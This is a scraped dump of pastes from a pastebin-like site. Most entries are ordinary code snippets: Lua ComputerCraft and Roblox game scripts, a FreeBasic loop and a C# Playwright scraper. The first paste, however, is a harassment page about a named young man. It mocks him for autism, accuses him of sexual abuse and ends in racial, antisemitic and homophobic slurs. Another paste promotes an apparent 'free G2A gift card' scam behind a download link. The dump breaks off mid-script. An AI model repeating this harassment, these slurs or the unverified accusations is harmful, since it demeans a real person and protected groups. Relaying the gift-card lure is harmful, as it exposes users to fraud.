U‎V‎ ‎I‎n‎d‎e‎x‎
4‎ ‎o‎f‎ ‎1‎1‎
S‎u‎n‎r‎i‎s‎e‎
7‎:‎2‎8‎ ‎a‎m‎
S‎u‎n‎s‎e‎t‎
7‎:‎4‎4‎ ‎p‎m‎
S‎u‎n‎ ‎2‎4‎ ‎|‎ ‎N‎i‎g‎h‎t‎
6‎3‎°‎
8‎9‎%‎
S‎
1‎8‎
 ‎
m‎p‎h‎
M‎o‎s‎t‎l‎y‎ ‎c‎l‎o‎u‎d‎y‎ ‎t‎h‎i‎s‎ ‎e‎v‎e‎n‎i‎n‎g‎ ‎w‎i‎t‎h‎ ‎t‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎ ‎d‎e‎v‎e‎l‎o‎p‎i‎n‎g‎ ‎a‎f‎t‎e‎r‎ ‎m‎i‎d‎n‎i‎g‎h‎t‎.‎ ‎L‎o‎w‎ ‎6‎3‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎ ‎a‎t‎ ‎1‎5‎ ‎t‎o‎ ‎2‎5‎ ‎m‎p‎h‎.‎ ‎C‎h‎a‎n‎c‎e‎ ‎o‎f‎ ‎r‎a‎i‎n‎ ‎9‎0‎%‎.‎
 ‎
H‎u‎m‎i‎d‎i‎t‎y‎
8‎7‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
0‎ ‎o‎f‎ ‎1‎1‎
M‎o‎o‎n‎r‎i‎s‎e‎
7‎:‎2‎6‎ ‎p‎m‎
F‎u‎l‎l‎ ‎M‎o‎o‎n‎
M‎o‎o‎n‎s‎e‎t‎
7‎:‎1‎4‎ ‎a‎m‎
M‎o‎n‎ ‎2‎5‎
A‎M‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
7‎9‎°‎
/‎4‎6‎°‎
9‎0‎%‎
W‎N‎W‎ ‎1‎7‎ ‎m‎p‎h‎
T‎u‎e‎ ‎2‎6‎
S‎u‎n‎n‎y‎
6‎8‎°‎
/‎4‎5‎°‎
2‎%‎
N‎N‎E‎ ‎1‎1‎ ‎m‎p‎h‎
W‎e‎d‎ ‎2‎7‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
6‎9‎°‎
/‎4‎5‎°‎
1‎5‎%‎
N‎E‎ ‎8‎ ‎m‎p‎h‎
T‎h‎u‎ ‎2‎8‎
S‎u‎n‎n‎y‎
7‎5‎°‎
/‎5‎2‎°‎
8‎%‎
N‎E‎ ‎7‎ ‎m‎p‎h‎
F‎r‎i‎ ‎2‎9‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎8‎°‎
/‎5‎8‎°‎
8‎%‎
S‎ ‎1‎6‎ ‎m‎p‎h‎
S‎a‎t‎ ‎3‎0‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎3‎°‎
/‎6‎4‎°‎
8‎%‎
S‎ ‎1‎3‎ ‎m‎p‎h‎
S‎u‎n‎ ‎3‎1‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎3‎°‎
/‎6‎8‎°‎
1‎3‎%‎
S‎ ‎1‎4‎ ‎m‎p‎h‎
M‎o‎n‎ ‎0‎1‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎5‎°‎
/‎6‎2‎°‎
8‎%‎
S‎S‎W‎ ‎1‎2‎ ‎m‎p‎h‎
T‎u‎e‎ ‎0‎2‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎6‎°‎
/‎5‎2‎°‎
7‎%‎
N‎ ‎1‎4‎ ‎m‎p‎h‎
W‎e‎d‎ ‎0‎3‎
S‎h‎o‎w‎e‎r‎s‎
7‎1‎°‎
/‎5‎2‎°‎
3‎8‎%‎
N‎N‎E‎ ‎1‎0‎ ‎m‎p‎h‎
T‎h‎u‎ ‎0‎4‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎6‎°‎
/‎5‎7‎°‎
2‎2‎%‎
E‎ ‎1‎0‎ ‎m‎p‎h‎
F‎r‎i‎ ‎0‎5‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎1‎°‎
/‎6‎1‎°‎
2‎3‎%‎
S‎S‎E‎ ‎1‎2‎ ‎m‎p‎h‎
S‎a‎t‎ ‎0‎6‎
P‎M‎ ‎S‎h‎o‎w‎e‎r‎s‎
8‎0‎°‎
/‎5‎9‎°‎
3‎7‎%‎
S‎S‎E‎ ‎1‎2‎ ‎m‎p‎h‎
S‎u‎n‎ ‎0‎7‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎9‎°‎
/‎5‎9‎°‎
2‎3‎%‎
N‎E‎ ‎1‎1‎ ‎m‎p‎h‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

C‎u‎r‎r‎e‎n‎t‎ ‎t‎h‎r‎e‎a‎t‎:‎ ‎P‎a‎k‎i‎ ‎H‎a‎c‎k‎e‎r‎s‎.‎ ‎🧔🏾‍♂️

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

K‎e‎e‎g‎a‎n‎ ‎S‎a‎l‎i‎s‎b‎u‎r‎y‎
K‎e‎e‎g‎a‎n‎ ‎J‎a‎m‎e‎s‎ ‎S‎a‎l‎i‎s‎b‎u‎r‎y‎ ‎i‎s‎ ‎a‎ ‎s‎e‎v‎e‎r‎e‎l‎y‎ ‎a‎u‎t‎i‎s‎t‎i‎c‎ ‎1‎9‎-‎y‎e‎a‎r‎-‎o‎l‎d‎ ‎n‎e‎a‎r‎-‎m‎a‎n‎c‎h‎i‎l‎d‎ ‎f‎r‎o‎m‎ ‎C‎r‎y‎s‎t‎a‎l‎ ‎L‎a‎k‎e‎,‎ ‎I‎l‎l‎i‎n‎o‎i‎s‎ ‎w‎i‎t‎h‎ ‎S‎p‎e‎c‎i‎a‎l‎ ‎S‎n‎o‎w‎f‎l‎a‎k‎e‎ ‎S‎y‎n‎d‎r‎o‎m‎e‎ ‎w‎h‎o‎ ‎u‎s‎u‎a‎l‎l‎y‎ ‎d‎o‎e‎s‎ ‎n‎o‎t‎h‎i‎n‎g‎ ‎b‎u‎t‎ ‎s‎i‎t‎ ‎o‎n‎ ‎h‎i‎s‎ ‎c‎o‎m‎p‎u‎t‎e‎r‎ ‎a‎n‎d‎ ‎m‎a‎k‎e‎ ‎b‎o‎t‎h‎ ‎Y‎T‎P‎s‎ ‎a‎n‎d‎ ‎Y‎T‎P‎M‎V‎s‎,‎ ‎w‎h‎a‎c‎k‎ ‎o‎f‎f‎ ‎t‎o‎ ‎h‎i‎s‎ ‎w‎a‎i‎f‎u‎s‎ ‎(‎s‎o‎m‎e‎ ‎o‎f‎ ‎w‎h‎i‎c‎h‎ ‎a‎r‎e‎ ‎u‎n‎d‎e‎r‎a‎g‎e‎)‎,‎ ‎t‎h‎r‎e‎a‎t‎e‎n‎ ‎p‎e‎o‎p‎l‎e‎ ‎h‎e‎ ‎d‎o‎e‎s‎n‎'‎t‎ ‎l‎i‎k‎e‎ ‎t‎o‎ ‎d‎o‎ ‎d‎a‎n‎g‎e‎r‎o‎u‎s‎ ‎i‎n‎t‎e‎r‎n‎e‎t‎ ‎a‎c‎t‎s‎,‎ ‎c‎y‎b‎e‎r‎s‎t‎a‎l‎k‎ ‎p‎e‎o‎p‎l‎e‎,‎ ‎o‎v‎e‎r‎r‎e‎a‎c‎t‎ ‎t‎o‎ ‎t‎h‎e‎ ‎s‎l‎i‎g‎h‎t‎e‎s‎t‎ ‎p‎r‎o‎v‎o‎c‎a‎t‎i‎o‎n‎s‎ ‎a‎n‎d‎ ‎h‎a‎v‎e‎ ‎a‎u‎t‎i‎s‎t‎i‎c‎ ‎m‎e‎l‎t‎d‎o‎w‎n‎s‎.‎

S‎o‎m‎e‎h‎o‎w‎,‎ ‎h‎e‎ ‎m‎a‎n‎a‎g‎e‎d‎ ‎t‎o‎ ‎s‎o‎m‎e‎w‎h‎a‎t‎ ‎b‎l‎e‎n‎d‎ ‎i‎n‎ ‎w‎i‎t‎h‎ ‎h‎i‎s‎ ‎h‎a‎l‎f‎-‎a‎s‎s‎e‎d‎ ‎v‎i‎g‎i‎l‎a‎n‎t‎e‎ ‎c‎a‎m‎p‎a‎i‎g‎n‎s‎ ‎a‎n‎d‎ ‎D‎D‎o‎S‎i‎n‎g‎ ‎(‎d‎e‎s‎p‎i‎t‎e‎ ‎g‎e‎t‎t‎i‎n‎g‎ ‎h‎a‎c‎k‎e‎d‎ ‎i‎n‎ ‎r‎e‎t‎u‎r‎n‎ ‎a‎s‎ ‎w‎e‎l‎l‎)‎.‎ ‎T‎h‎i‎s‎ ‎t‎r‎a‎i‎n‎ ‎o‎f‎ ‎s‎p‎e‎r‎g‎e‎r‎y‎ ‎e‎n‎d‎e‎d‎ ‎a‎f‎t‎e‎r‎ ‎i‎t‎ ‎w‎a‎s‎ ‎r‎e‎v‎e‎a‎l‎e‎d‎ ‎h‎e‎ ‎s‎e‎x‎u‎a‎l‎l‎y‎ ‎h‎a‎r‎a‎s‎s‎e‎d‎ ‎K‎y‎l‎i‎e‎ ‎(‎w‎h‎o‎ ‎w‎o‎u‎l‎d‎ ‎b‎e‎c‎o‎m‎e‎ ‎o‎n‎e‎ ‎o‎f‎ ‎h‎i‎s‎ ‎e‎x‎e‎s‎)‎,‎ ‎a‎n‎d‎ ‎K‎e‎e‎g‎a‎n‎'‎s‎ ‎w‎o‎r‎l‎d‎ ‎c‎a‎m‎e‎ ‎c‎r‎a‎s‎h‎i‎n‎g‎ ‎d‎o‎w‎n‎ ‎u‎p‎o‎n‎ ‎h‎i‎m‎.‎ ‎A‎f‎t‎e‎r‎ ‎g‎e‎t‎t‎i‎n‎g‎ ‎c‎a‎u‎g‎h‎t‎ ‎i‎n‎ ‎4‎K‎ ‎o‎v‎e‎r‎ ‎s‎e‎x‎u‎a‎l‎l‎y‎ ‎a‎b‎u‎s‎i‎n‎g‎ ‎K‎y‎l‎i‎e‎,‎ ‎K‎e‎e‎g‎a‎n‎ ‎s‎t‎a‎r‎t‎e‎d‎ ‎d‎e‎g‎r‎a‎d‎i‎n‎g‎ ‎h‎e‎r‎ ‎a‎t‎ ‎t‎h‎e‎ ‎s‎p‎e‎e‎d‎ ‎o‎f‎ ‎l‎i‎g‎h‎t‎.‎ ‎K‎e‎e‎g‎a‎n‎ ‎g‎o‎t‎ ‎b‎u‎t‎t‎h‎u‎r‎t‎ ‎o‎v‎e‎r‎ ‎p‎e‎o‎p‎l‎e‎ ‎r‎i‎g‎h‎t‎f‎u‎l‎l‎y‎ ‎c‎a‎l‎l‎i‎n‎g‎ ‎o‎u‎t‎ ‎h‎i‎s‎ ‎p‎e‎r‎v‎e‎r‎t‎e‎d‎ ‎l‎a‎r‎d‎-‎a‎s‎s‎ ‎a‎n‎d‎ ‎f‎o‎r‎m‎e‎d‎ ‎a‎ ‎n‎e‎w‎ ‎c‎o‎m‎m‎u‎n‎i‎t‎y‎ ‎o‎u‎t‎ ‎o‎f‎ ‎h‎i‎s‎ ‎b‎a‎s‎e‎d‎ ‎e‎x‎-‎f‎r‎i‎e‎n‎d‎s‎'‎ ‎c‎r‎i‎n‎g‎e‎ ‎e‎n‎e‎m‎i‎e‎s‎ ‎t‎o‎ ‎f‎o‎r‎m‎ ‎a‎n‎ ‎e‎n‎t‎i‎r‎e‎ ‎b‎a‎t‎t‎a‎l‎i‎o‎n‎ ‎o‎f‎ ‎m‎e‎n‎t‎a‎l‎ ‎l‎o‎l‎c‎o‎w‎s‎ ‎s‎q‎u‎i‎r‎t‎i‎n‎g‎ ‎l‎u‎l‎z‎y‎ ‎m‎i‎l‎k‎ ‎2‎4‎/‎7‎.‎ ‎T‎h‎i‎s‎ ‎r‎e‎t‎a‎r‎d‎ ‎w‎a‎s‎ ‎p‎r‎e‎v‎i‎o‎u‎s‎l‎y‎ ‎m‎e‎n‎t‎i‎o‎n‎e‎d‎ ‎o‎n‎ ‎a‎n‎o‎t‎h‎e‎r‎ ‎p‎a‎g‎e‎ ‎t‎h‎a‎t‎ ‎w‎a‎s‎ ‎o‎r‎i‎g‎i‎n‎a‎l‎l‎y‎ ‎r‎e‎m‎o‎v‎e‎d‎ ‎b‎e‎c‎a‎u‎s‎e‎ ‎h‎e‎ ‎r‎e‎p‎o‎r‎t‎e‎d‎ ‎i‎t‎ ‎a‎n‎d‎ ‎c‎l‎a‎i‎m‎e‎d‎ ‎i‎t‎ ‎w‎a‎s‎ ‎""‎b‎u‎l‎l‎y‎i‎n‎g‎ ‎h‎i‎m‎ ‎a‎n‎d‎ ‎i‎n‎v‎a‎d‎i‎n‎g‎ ‎h‎i‎s‎ ‎p‎r‎i‎v‎a‎c‎y‎""‎.‎ ‎T‎o‎ ‎b‎e‎ ‎f‎a‎i‎r‎,‎ ‎h‎e‎ ‎w‎a‎s‎ ‎j‎u‎s‎t‎ ‎a‎ ‎w‎h‎i‎n‎y‎ ‎9‎-‎y‎e‎a‎r‎-‎o‎l‎d‎ ‎b‎a‎c‎k‎ ‎t‎h‎e‎n‎,‎ ‎b‎u‎t‎ ‎n‎o‎w‎ ‎h‎e‎ ‎b‎e‎c‎a‎m‎e‎ ‎a‎ ‎f‎a‎t‎ ‎1‎9‎-‎y‎e‎a‎r‎-‎o‎l‎d‎ ‎a‎u‎t‎i‎s‎t‎i‎c‎ ‎p‎a‎n‎s‎e‎x‎u‎a‎l‎ ‎w‎h‎o‎ ‎h‎a‎s‎n‎'‎t‎ ‎l‎e‎a‎r‎n‎e‎d‎ ‎f‎r‎o‎m‎ ‎h‎i‎s‎ ‎m‎i‎s‎t‎a‎k‎e‎s‎.‎


(‎(‎ ‎B‎E‎ ‎Q‎U‎I‎E‎T‎ ‎M‎O‎M‎,‎ ‎I‎'‎M‎ ‎M‎A‎K‎I‎N‎G‎ ‎A‎ ‎V‎I‎D‎E‎O‎ ‎F‎O‎R‎ ‎P‎L‎A‎Y‎I‎N‎G‎ ‎A‎N‎G‎R‎Y‎ ‎B‎I‎R‎D‎S‎ ‎F‎O‎R‎ ‎G‎O‎O‎G‎L‎E‎ ‎C‎H‎R‎O‎M‎E‎!‎!‎ ‎)‎)‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

P‎A‎G‎E‎O‎S‎ ‎(‎P‎a‎s‎s‎i‎v‎e‎ ‎G‎e‎o‎d‎e‎t‎i‎c‎ ‎E‎a‎r‎t‎h‎ ‎O‎r‎b‎i‎t‎i‎n‎g‎ ‎S‎a‎t‎e‎l‎l‎i‎t‎e‎)‎ ‎w‎a‎s‎ ‎a‎ ‎b‎a‎l‎l‎o‎o‎n‎ ‎s‎a‎t‎e‎l‎l‎i‎t‎e‎ ‎w‎h‎i‎c‎h‎ ‎w‎a‎s‎ ‎l‎a‎u‎n‎c‎h‎e‎d‎ ‎b‎y‎ ‎N‎A‎S‎A‎ ‎i‎n‎ ‎1‎9‎6‎6‎.‎ ‎I‎t‎ ‎w‎a‎s‎ ‎p‎l‎a‎c‎e‎d‎ ‎i‎n‎t‎o‎ ‎a‎ ‎p‎o‎l‎a‎r‎ ‎o‎r‎b‎i‎t‎ ‎(‎i‎n‎c‎l‎i‎n‎a‎t‎i‎o‎n‎ ‎8‎5‎–‎8‎6‎°‎)‎ ‎w‎i‎t‎h‎ ‎a‎ ‎h‎e‎i‎g‎h‎t‎ ‎o‎f‎ ‎a‎p‎p‎r‎o‎x‎i‎m‎a‎t‎e‎l‎y‎ ‎4‎0‎0‎0‎ ‎k‎m‎,‎ ‎w‎h‎i‎c‎h‎ ‎b‎e‎c‎a‎m‎e‎ ‎g‎r‎a‎d‎u‎a‎l‎l‎y‎ ‎l‎o‎w‎e‎r‎ ‎d‎u‎r‎i‎n‎g‎ ‎i‎t‎s‎ ‎n‎i‎n‎e‎ ‎y‎e‎a‎r‎s‎ ‎o‎f‎ ‎o‎p‎e‎r‎a‎t‎i‎o‎n‎.‎ ‎T‎h‎e‎ ‎s‎a‎t‎e‎l‎l‎i‎t‎e‎ ‎p‎a‎r‎t‎l‎y‎ ‎d‎i‎s‎i‎n‎t‎e‎g‎r‎a‎t‎e‎d‎ ‎i‎n‎ ‎J‎u‎l‎y‎ ‎1‎9‎7‎5‎,‎ ‎w‎h‎i‎c‎h‎ ‎w‎a‎s‎ ‎f‎o‎l‎l‎o‎w‎e‎d‎ ‎b‎y‎ ‎a‎ ‎s‎e‎c‎o‎n‎d‎ ‎b‎r‎e‎a‎k‎-‎u‎p‎ ‎t‎h‎a‎t‎ ‎o‎c‎c‎u‎r‎r‎e‎d‎ ‎i‎n‎ ‎J‎a‎n‎u‎a‎r‎y‎ ‎1‎9‎7‎6‎ ‎r‎e‎s‎u‎l‎t‎i‎n‎g‎ ‎i‎n‎ ‎t‎h‎e‎ ‎r‎e‎l‎e‎a‎s‎e‎ ‎o‎f‎ ‎a‎ ‎l‎a‎r‎g‎e‎ ‎n‎u‎m‎b‎e‎r‎ ‎o‎f‎ ‎f‎r‎a‎g‎m‎e‎n‎t‎s‎.‎ ‎M‎o‎s‎t‎ ‎o‎f‎ ‎t‎h‎e‎s‎e‎ ‎r‎e‎-‎e‎n‎t‎e‎r‎e‎d‎ ‎t‎h‎e‎ ‎E‎a‎r‎t‎h‎'‎s‎ ‎a‎t‎m‎o‎s‎p‎h‎e‎r‎e‎ ‎d‎u‎r‎i‎n‎g‎ ‎t‎h‎e‎ ‎f‎o‎l‎l‎o‎w‎i‎n‎g‎ ‎d‎e‎c‎a‎d‎e‎.‎ ‎T‎h‎i‎s‎ ‎p‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎s‎h‎o‎w‎s‎ ‎a‎ ‎t‎e‎s‎t‎ ‎i‎n‎f‎l‎a‎t‎i‎o‎n‎ ‎o‎f‎ ‎a‎ ‎P‎A‎G‎E‎O‎S‎ ‎s‎a‎t‎e‎l‎l‎i‎t‎e‎ ‎i‎n‎ ‎a‎ ‎b‎l‎i‎m‎p‎ ‎h‎a‎n‎g‎a‎r‎ ‎a‎t‎ ‎W‎e‎e‎k‎s‎v‎i‎l‎l‎e‎,‎ ‎N‎o‎r‎t‎h‎ ‎C‎a‎r‎o‎l‎i‎n‎a‎,‎ ‎i‎n‎ ‎1‎9‎6‎5‎.‎

P‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎c‎r‎e‎d‎i‎t‎:‎ ‎N‎A‎S‎A‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

B‎y‎e‎,‎ ‎g‎u‎y‎s‎.‎ ‎I‎'‎m‎ ‎g‎o‎n‎n‎a‎ ‎g‎o‎ ‎p‎l‎a‎y‎ ‎t‎h‎e‎ ‎f‎l‎u‎t‎e‎ ‎i‎n‎ ‎f‎r‎o‎n‎t‎ ‎o‎f‎ ‎a‎n‎ ‎I‎n‎d‎i‎a‎n‎ ‎p‎e‎r‎s‎o‎n‎.‎ ‎I‎f‎ ‎t‎h‎a‎t‎ ‎w‎a‎s‎n‎'‎t‎ ‎o‎f‎f‎e‎n‎s‎i‎v‎e‎ ‎e‎n‎o‎u‎g‎h‎,‎ ‎f‎u‎c‎k‎ ‎y‎o‎u‎.‎ ‎S‎o‎m‎e‎t‎i‎m‎e‎s‎,‎ ‎I‎ ‎j‎u‎s‎t‎ ‎l‎i‎k‎e‎ ‎t‎o‎ ‎p‎l‎a‎y‎ ‎t‎h‎e‎ ‎f‎l‎u‎t‎e‎,‎ ‎y‎o‎u‎ ‎f‎u‎c‎k‎i‎n‎g‎ ‎n‎i‎g‎g‎e‎r‎ ‎s‎p‎i‎c‎ ‎k‎i‎k‎e‎ ‎c‎h‎i‎n‎k‎ ‎c‎u‎n‎t‎ ‎J‎e‎w‎i‎s‎h‎ ‎n‎i‎g‎g‎e‎r‎ ‎m‎o‎n‎k‎e‎y‎ ‎f‎a‎g‎g‎o‎t‎ ‎a‎s‎s‎ ‎p‎i‎r‎a‎t‎e‎ ‎f‎u‎d‎g‎e‎ ‎p‎a‎c‎k‎i‎n‎g‎ ‎s‎p‎i‎c‎ ‎p‎i‎s‎s‎ ‎d‎r‎i‎n‎k‎i‎n‎g‎ ‎n‎i‎g‎g‎e‎r‎!‎"
rtca81qY,Mad,Unknown_No_1,PHP,Sunday 24th of March 2024 08:51:45 PM CDT,HappyHoliByMadGamerTG
JJzdujKu,🤑 G2A.com Free Gift Card Guide Mar 2024 FIX 🤑,PASUSW,GetText,Sunday 24th of March 2024 08:50:50 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
If you use this make sure to use the English version of G2A.com otherwise this will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view?usp=sharing
 
Working as of:
25 March 2024
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 


 


 "
URF5trpt,Untitled,retroman,FreeBasic,Sunday 24th of March 2024 08:50:44 PM CDT,"dim strings(6) as string = {""abc"",""abcd"",""abcde"",""abcdef"",""abcdefg"",""abcdefgh""}

	for i as integer = 0 to 5 step 1
		for j as integer = 5 to 0 step -1
			if len(strings(i)) < len(strings(j)) then
				print ""the longest string is: ""; j
				end
			end if
		next
	next
sleep"
vmW7wgKb,Pastes.io [Pastebin Alternative],xxsa,PHP,Sunday 24th of March 2024 08:36:29 PM CDT,"https://pastes.io - #1 Pastebin Alternative - its free.

Pastes.io is a simple and efficient pastebin for mainly code to be distributed neatly and efficiently across the web. Website where you can paste and store any type of text or code snippets online and share it with your friends, Also You can see Recent Pastes

Simple Ads by Google Adsense Few rather than Pastebin
150+ different syntax languages - All Free
Paste Folders
Load files feature
Password protected pastes
Encrypted pastes.
URL Shortener.
Unlisted pastes.
Private pastes.
Embed, download, print pastes.
Socialite (Facebook/Twitter/Google Social login)
Trending pastes page (day, week, month, year)
Encrypted pastes.x
Trending pastes page (day, week, month, year).
No Captcha for logged in users feature.
.."
80RdFS6k,Untitled,dereksir,C#,Sunday 24th of March 2024 08:30:49 PM CDT,"using Microsoft.Playwright;
using System.Threading.Tasks;

class Program
{
    static async Task Main(string[] args)
    {
        // launch Playwright
        using var playwright = await Playwright.CreateAsync();

        // launch Chromium browser
        await using var browser = await playwright.Chromium.LaunchAsync(new BrowserTypeLaunchOptions { Headless = true });

        // create a new page
        var page = await browser.NewPageAsync();

        // navigate to the scrapeme website
        await page.GotoAsync(""https://scrapeme.live/shop/Pikachu/"");

        // extract the product price
        var priceElement = await page.QuerySelectorAsync(""#product-752 > div.summary.entry-summary > p.price > span"");
        var productPrice = await priceElement.InnerTextAsync();

        // print the product price
        Console.WriteLine($""Product Price: {productPrice}"");

        // close the browser
        await browser.CloseAsync();
    }
}"
hjhBDB1x,shipbuild,ChickenSquiggles,Lua,Sunday 24th of March 2024 08:20:33 PM CDT,"turtle.select(16)
turtle.refuel()

for i=1,3 do
    turtle.up()
end

turtle.select(3)
turtle.placeDown()
turtle.back()
turtle.placeDown()
turtle.forward()
turtle.forward()
turtle.placeDown()
turtle.back()
turtle.turnLeft()
turtle.forward()
turtle.placeDown()
turtle.back()
turtle.back()
turtle.placeDown()

turtle.select(2)

turtle.turnLeft()
turtle.forward()
turtle.placeDown()
turtle.back()
turtle.back()
turtle.placeDown()
turtle.turnRight()
turtle.forward()
turtle.forward()
turtle.placeDown()
turtle.turnLeft()
turtle.forward()
turtle.forward()
turtle.placeDown()

turtle.select(1)

turtle.back()
turtle.turnLeft()
turtle.forward()
turtle.turnRight()
turtle.place()"
BkFdvGdv,Miner Remote,Alexr360,Lua,Sunday 24th of March 2024 08:10:13 PM CDT,"local function clearScreen()
  term.clear()
  term.setCursorPos(1, 1)
end

-- Function to check the GPS y-coordinate
local function checkYCoordinate()
    -- Get the current GPS location
    local x, y, z = gps.locate(2, false)

    -- Check if the GPS location was successfully obtained
    if x and y and z then
        clearScreen()
        -- Check if the y-coordinate is below -55
        if y < -55 then
            print(""The y-coordinate is below -55."")

            local modem = peripheral.find(""modem"") or error(""No modem attached"", 0)
			modem.open(43) -- Open 43 so we can receive replies

			modem.transmit(92, 43, ""Retract"")
            return true  -- Exit the loop
        else
            print(""The y-coordinate is "" .. y)
            return false  -- Continue the loop
        end
    else
        print(""GPS location not found."")
        return false  -- Continue the loop
    end
end

-- Main loop to continuously check the y-coordinate
while not checkYCoordinate() do
    os.sleep(1)  -- Wait for 1 second before checking again
end
"
8pF6ds3s,Bastion Remote Force,Alexr360,Lua,Sunday 24th of March 2024 07:47:48 PM CDT,"local function clearScreen()
  term.clear()
  term.setCursorPos(1, 1)
end

local modem = peripheral.find(""modem"") or error(""No modem attached"", 0)
modem.open(43) -- Open 43 so we can receive replies

-- Send our message
print(""Enter your message:"")
local userMessage = read()
modem.transmit(15, 43, userMessage)

-- And wait for a reply
local event, side, channel, replyChannel, message, distance
repeat
  event, side, channel, replyChannel, message, distance = os.pullEvent(""modem_message"")
until channel == 43

clearScreen()

print(tostring(message))"
wxBeL5ZT,FNaF Part 5: Updated Left Door Script,qaltx,Lua,Sunday 24th of March 2024 07:44:46 PM CDT,"db = false
door = false
light = false

local ReplicatedStorage = game:GetService(""ReplicatedStorage"")
local Values = ReplicatedStorage.Values

script.Parent.LightButton.ClickDetector.MouseClick:Connect(function()
	if not db then db = true
		if not light then light = true
			Values.Power.Usage.Value += 1
			script.Parent.Dark.Transparency = 1
			script.Parent.LightButton.BrickColor = BrickColor.new(""Cool yellow"")
			db = false
		elseif light then
			Values.Power.Usage.Value -= 1
			script.Parent.Dark.Transparency = 0
			script.Parent.LightButton.BrickColor = BrickColor.new(""Dark stone grey"")
			db = false light = false
		end
	end
end)
script.Parent.DoorButton.ClickDetector.MouseClick:connect(function()
	if not db then db = true
		if not door then door = true
			Values.Power.Usage.Value += 1
			script.Parent.DoorButton.BrickColor = BrickColor.new(""Lime green"")
			for i=0,15 do
				script.Parent.Door.CFrame = script.Parent.Door.CFrame - Vector3.new(0,0.8,0)
				wait()
			end
			script.Parent.Door.CFrame = script.Parent.Door.CFrame - Vector3.new(0,0.2,0)
			db = false
		elseif door then door = false
			Values.Power.Usage.Value -= 1
			script.Parent.DoorButton.BrickColor = BrickColor.new(""Really red"")
			for i=0,15 do
				script.Parent.Door.CFrame = script.Parent.Door.CFrame + Vector3.new(0,0.8,0)
				wait()
			end
			script.Parent.Door.CFrame = script.Parent.Door.CFrame + Vector3.new(0,0.2,0)
			db = false
		end
	end
end)"
VgESdSe9,FNaF Part 5: Updated Camera Script,qaltx,Lua,Sunday 24th of March 2024 07:43:21 PM CDT,"local Player = game.Players.LocalPlayer
local Char = Player.CharacterAdded
local buttons = script.Parent.Buttons
local cams = workspace.CurrentCamera
local btn = script.Parent.Parent.View.CameraButton

local Cameras = workspace:WaitForChild(""Cameras"")
local tweenService = game:GetService(""TweenService"")

local views = workspace:WaitForChild(""Views"")
local soundCamera = workspace:WaitForChild(""Sounds""):WaitForChild(""CameraSound"")
local soundTransition = workspace:WaitForChild(""Sounds""):WaitForChild(""CameraTransition"")

local ReplicatedStorage = game:GetService(""ReplicatedStorage"")
local Values = ReplicatedStorage.Values

local viewUI = script.Parent.Parent.View

-- // buttons view
local viewMain = viewUI.MainView
local viewRight = viewUI.RightView
local viewLeft = viewUI.LeftView

db = false
camera = false

function tweenCamera(pos,tweenTime)
	tweenService:Create(cams,TweenInfo.new(tweenTime,Enum.EasingStyle.Linear),{CFrame = pos.CFrame}):Play()
end
btn.MouseEnter:Connect(function()
	if not db then db = true
		if not camera then camera = true
			script.Parent.Parent.Cameras.Enabled = true
			wait(0.05)
			soundCamera:Play()
			wait(0.1)
			soundTransition:Play()
			buttons.Visible = true

			viewMain.Visible = false
			viewRight.Visible = false
			viewLeft.Visible = false
			
			Values.Power.Usage.Value += 1
			tweenCamera(Cameras.Camera1.Camera,0)
			db = false
		elseif camera then camera = false
			script.Parent.Parent.Cameras.Enabled = false
			soundCamera:Stop()
			buttons.Visible = false

			viewMain.Visible = true
			viewRight.Visible = true
			viewLeft.Visible = true
			
			Values.Power.Usage.Value -= 1
			tweenCamera(views.ViewMain,0)
			db = false
		end
	end
end)"
FddxsAqr,Miner Control,Alexr360,Lua,Sunday 24th of March 2024 07:42:51 PM CDT,"local function clearScreen()
  term.clear()
  term.setCursorPos(1, 1)
end

-- Set the side of the computer where the redstone signal will be emitted (change 'back' if needed)
local side = ""back""

redstone.setOutput(side, true)

-- Prompt the player to press enter to start
print(""Press Enter to start emitting the redstone signal."")
while true do
  local event, key = os.pullEvent(""key"")
  if event == ""key"" and key == keys.enter then
    break
  end
end

clearScreen()

-- Activate the redstone output
redstone.setOutput(side, false)
print(""Redstone signal activated."")

local modem = peripheral.find(""modem"") or error(""No modem attached"", 0)
modem.open(92) -- Open 43 so we can receive replies

-- And wait for a reply
local event, side, channel, replyChannel, message, distance
repeat
    event, side, channel, replyChannel, message, distance = os.pullEvent(""modem_message"")
until channel == 92

-- Deactivate the redstone output after the duration
redstone.setOutput(side, true)
print(""Redstone signal deactivated."")
os.reboot()"
B5aKdWuR,FNaF Part 5: Power Local,qaltx,Lua,Sunday 24th of March 2024 07:42:14 PM CDT,"local RunService = game:GetService(""RunService"")
local ReplicatedStorage = game:GetService(""ReplicatedStorage"")
